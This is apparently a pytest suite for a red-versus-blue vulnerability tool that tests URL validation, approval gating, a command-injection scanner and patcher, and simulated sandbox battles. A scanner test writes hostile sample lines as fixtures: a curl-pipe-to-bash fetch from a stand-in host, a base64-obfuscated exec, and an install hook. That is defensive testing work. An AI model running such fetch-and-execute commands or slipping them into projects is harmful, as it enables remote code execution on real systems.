import asyncio
import time
from pathlib import Path

import pytest

from vulnigo import battle, config, intake, patcher, sandbox, scanner, store
from vulnigo.state import IllegalTransition, S, check

DEMO = config.DEMO_REPO_DIR


# ---------------------------------------------------------------- intake
@pytest.mark.parametrize("url", [
    "file:///etc/passwd", "http://github.com/a/b", "ssh://git@github.com/a/b", "git://github.com/a/b",
    "https://10.0.0.1/a/b", "https://localhost/a/b", "https://github.com.evil.com/a/b",
    "https://user:pw@github.com/a/b", "https://github.com/a/b?x=1", "https://github.com/a",
    "https://github.com/a/b/c", "https://github.com/../b", "https://github.com:8080/a/b", "",
])
def test_rejects_bad_urls(url):
    with pytest.raises(intake.IntakeError):
        intake.validate_github_url(url)


def test_accepts_github_url():
    assert intake.validate_github_url("https://github.com/Owner/repo.git") == "https://github.com/Owner/repo"


# ---------------------------------------------------------------- state machine
def test_cannot_skip_approval():
    with pytest.raises(IllegalTransition):
        check(S.DEFENDING, S.PATCHING)
    with pytest.raises(IllegalTransition):
        check(S.ATTACKING, S.DEFENDING)
    check(S.AWAITING_APPROVAL, S.PATCHING)


# ---------------------------------------------------------------- scanner & patch
def test_scanner_finds_planted_bug():
    found = scanner.scan_command_injection(DEMO)
    assert len(found) == 1
    f = found[0]
    assert (f["file"], f["function"], f["param"], f["line_start"]) == ("filedesk/tools.py", "file_size", "filename", 11)


def test_deterministic_fix_removes_shell():
    f = scanner.scan_command_injection(DEMO)[0]
    p = patcher.deterministic_fix(str(DEMO), f)
    assert "shell=True" not in p["new_text"]
    assert '["wc", "-c", f"{UPLOAD_DIR}/{filename}"]' in p["new_text"]
    tmp = Path(config.DATA_DIR) / "patched_check"
    import shutil
    shutil.rmtree(tmp, ignore_errors=True)
    shutil.copytree(DEMO, tmp)
    (tmp / f["file"]).write_text(p["new_text"], encoding="utf-8")
    assert scanner.scan_command_injection(tmp) == []


def test_patch_validator_blocks_dangerous_patches():
    src = (DEMO / "filedesk/tools.py").read_text()
    with pytest.raises(patcher.PatchError):
        patcher.validate(src, src)
    with pytest.raises(patcher.PatchError):
        patcher.validate(src, src.replace("import subprocess", "import subprocess\nimport socket"))
    with pytest.raises(patcher.PatchError):
        patcher.validate(src, src + "\ndef broken(:\n")


def test_repo_check_flags_malicious_code(tmp_path):
    (tmp_path / "install.sh").write_text("curl -s http://x.example/p.sh | bash\n")
    (tmp_path / "a.py").write_text("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "node -e \\"require(1)\\""}}')
    kinds = {f["kind"] for f in scanner.scan_repo_check(tmp_path)["findings"]}
    assert {"remote-script-exec", "obfuscated-exec", "install-hook"} <= kinds


# ---------------------------------------------------------------- full battles with a simulated sandbox
@pytest.fixture
def fake_sandbox(monkeypatch):
    """Simulates container results from the actual file contents (vulnerable iff shell=True remains)."""
    state = {"break_regression": False}

    async def fake_run(run_id, action, code_dir, spec=None, is_demo=False, label=""):
        text = (Path(code_dir) / "filedesk/tools.py").read_text()
        if (spec or {}).get("category") == "path-traversal":
            vulnerable = "os.path.basename(filename) != filename" not in text
        else:
            vulnerable = "shell=True" in text
        outcome = {"probe": "pass", "proof": "pass" if vulnerable else "fail", "benign": "pass",
                   "regression": "fail" if state["break_regression"] else "pass"}[action]
        result = {"checks": [{"check": "net", "blocked": True, "detail": "x"}], "all_blocked": True} if action == "probe" else {"confirmed": vulnerable}
        return store.insert("test_runs", {"id": store.new_id("tr"), "run_id": run_id, "kind": action, "command": action,
                                          "env_id": "sim", "exit_code": 0, "output": "", "started": time.time(),
                                          "ended": time.time(), "outcome": outcome, "sandboxed": 1,
                                          "data": {"label": label, "result": result}})

    monkeypatch.setattr(sandbox, "run", fake_run)
    return state


async def _approve_when_ready(run, decision="approved"):
    for _ in range(200):
        if run.waiting == "approval":
            battle.submit_approval(run, run.patch_id, decision, "test")
            return
        await asyncio.sleep(0.02)
    raise AssertionError("never reached approval")


def test_spectator_battle_fixed_and_retested(fake_sandbox):
    async def go():
        run = battle.create("battle", None, "spectator", None)
        await _approve_when_ready(run)
        await run.task
        return run
    run = asyncio.run(go())
    assert run.state == S.COMPLETED
    rep = store.get("reports", run.id, key="run_id")["body"]
    assert rep["findings"][0]["status"] == "Fixed and retested"
    assert rep["scores"]["blue"]["total"] == 125 and rep["scores"]["red"]["total"] == 100
    assert all(line["evidence"] for side in rep["scores"].values() for line in side["lines"])
    assert rep["approvals"][0]["decision"] == "approved"


def test_rejected_patch_changes_nothing(fake_sandbox):
    async def go():
        run = battle.create("battle", None, "spectator", None)
        await _approve_when_ready(run, "rejected")
        await run.task
        return run
    run = asyncio.run(go())
    assert run.state == S.PATCH_REJECTED
    assert not [t for t in store.list_for("test_runs", run.id) if (t["data"] or {}).get("label", "").startswith("retest")]


def test_broken_regressions_are_unresolved(fake_sandbox):
    fake_sandbox["break_regression"] = True

    async def go():
        run = battle.create("battle", None, "spectator", None)
        await _approve_when_ready(run)
        await run.task
        return run
    assert asyncio.run(go()).state == S.UNRESOLVED


def test_no_sandbox_is_inconclusive_never_confirmed(monkeypatch):
    async def no_docker():
        return False
    monkeypatch.setattr(sandbox, "docker_available", no_docker)
    monkeypatch.setattr(config, "ALLOW_UNSANDBOXED_DEMO", False)

    async def go():
        run = battle.create("battle", None, "spectator", None)
        await run.task
        return run
    run = asyncio.run(go())
    assert run.state == S.ATTACK_INCONCLUSIVE
    assert all(f["status"] != "confirmed" for f in store.list_for("findings", run.id))


@pytest.mark.parametrize(("proof_outcomes", "expected_state", "expected_finding_status"), [
    (("pass", "fail"), S.ATTACK_INCONCLUSIVE, "inconclusive"),
    (("pass", "inconclusive"), S.ATTACK_INCONCLUSIVE, "inconclusive"),
    (("fail", "inconclusive"), S.ATTACK_INCONCLUSIVE, "inconclusive"),
    (("pass", "pass"), S.COMPLETED, "fixed"),
    (("fail", "fail"), S.NO_CONFIRMED_FINDING, "unconfirmed"),
])
def test_inconsistent_or_incomplete_proof_runs_are_inconclusive(
    monkeypatch, proof_outcomes, expected_state, expected_finding_status
):
    outcomes = iter(proof_outcomes)

    async def inconsistent_run(run_id, action, code_dir, spec=None, is_demo=False, label=""):
        if action == "proof" and label.startswith("attack proof"):
            outcome = next(outcomes)
        else:
            outcome = {
                "probe": "pass", "proof": "fail", "benign": "pass", "regression": "pass",
            }[action]
        result = {"checks": [{"check": "net", "blocked": True, "detail": "x"}],
                  "all_blocked": True} if action == "probe" else {"confirmed": outcome == "pass"}
        return store.insert("test_runs", {"id": store.new_id("tr"), "run_id": run_id, "kind": action,
                                          "command": action, "env_id": "sim", "exit_code": 0, "output": "",
                                          "started": time.time(), "ended": time.time(), "outcome": outcome,
                                          "sandboxed": 1, "data": {"label": label, "result": result}})

    monkeypatch.setattr(sandbox, "run", inconsistent_run)

    async def go():
        run = battle.create("battle", None, "participate", "red")
        while not run.task.done():
            if run.waiting == "red_attack":
                battle.submit_human(run, {"payload": "a second validation attempt"})
            elif run.waiting == "approval":
                battle.submit_approval(run, run.patch_id, "approved", "test")
            elif run.waiting == "red_retest":
                battle.submit_human(run, {"proceed": True})
            await asyncio.sleep(0.02)
        await run.task
        return run

    run = asyncio.run(go())
    assert run.state == expected_state
    finding = store.list_for("findings", run.id)[0]
    assert finding["status"] == expected_finding_status


def test_apply_refuses_without_approval(fake_sandbox):
    async def go():
        run = battle.create("battle", None, "spectator", None)
        for _ in range(200):
            if run.waiting == "approval":
                break
            await asyncio.sleep(0.02)
        with pytest.raises(patcher.PatchError, match="no approval"):
            patcher.apply(run.id, run.patch_id, run.paths["work"])
        battle.submit_approval(run, run.patch_id, "rejected", "")
        await run.task
    asyncio.run(go())


def test_blue_participant_patch_and_backup(fake_sandbox):
    async def go():
        run = battle.create("battle", None, "participate", "blue")
        for _ in range(200):
            if run.waiting == "blue_patch":
                break
            await asyncio.sleep(0.02)
        await battle.request_backup(run)
        f = run.finding
        battle.submit_human(run, {"line_start": f["line_start"], "line_end": f["line_end"],
                                  "replacement": '    result = subprocess.run(["wc", "-c", f"{UPLOAD_DIR}/{filename}"], capture_output=True, text=True, timeout=5)'})
        await _approve_when_ready(run)
        await run.task
        return run
    run = asyncio.run(go())
    assert run.state == S.COMPLETED
    assert store.list_for("patches", run.id)[0]["author"] == "human"
    assert any(e["type"] == "backup" for e in store.list_for("events", run.id))


def test_pick_model_skips_non_chat_models(monkeypatch):
    import asyncio
    from vulnigo import config, llm
    listed = ["qwen3-asr-1.7b", "qwen3-tts-12hz-1.7b", "qwen3-embedding-4b", "qwen-image-2.1",
              "deepseek-v4.1-flash-1017", "qwen3.8-27b", "whisper-large-v3-turbo"]

    async def fake_list():
        return listed
    monkeypatch.setattr(llm, "list_models", fake_list)
    for role in ("RED_MODEL", "BLUE_MODEL", "MANAGER_MODEL"):
        monkeypatch.setattr(config, role, "")
    red = asyncio.run(llm.pick_model("red"))
    blue = asyncio.run(llm.pick_model("blue"))
    assert red == "deepseek-v4.1-flash-1017"
    assert blue == "qwen3.8-27b"


def test_agent_output_is_fitted_not_discarded():
    from vulnigo import agents
    raw = {"root_cause": "x" * 2000, "line_start": 1, "line_end": 2, "replacement": "y",
           "risks": "one risk", "assumptions": ["a"] * 9, "limitations": ["first", "second"]}
    out = agents.BlueOut.model_validate(agents._fit(raw, agents.BlueOut))
    assert len(out.root_cause) <= 800 and out.root_cause.endswith("...")
    assert out.risks == ["one risk"] and len(out.assumptions) == 6
    assert out.limitations == "first; second"


def test_fit_joins_list_replacement_with_newlines():
    # issue #7: a model returning code as a list of lines must not get it glued with "; "
    from vulnigo import agents
    lines = ["if x:", "    raise ValueError", "return 1"]
    raw = {"root_cause": ["guard x", "then return"], "line_start": 1, "line_end": 2, "replacement": lines}
    out = agents.BlueOut.model_validate(agents._fit(raw, agents.BlueOut))
    assert out.replacement == "\n".join(lines)
    assert out.root_cause == "guard x; then return"
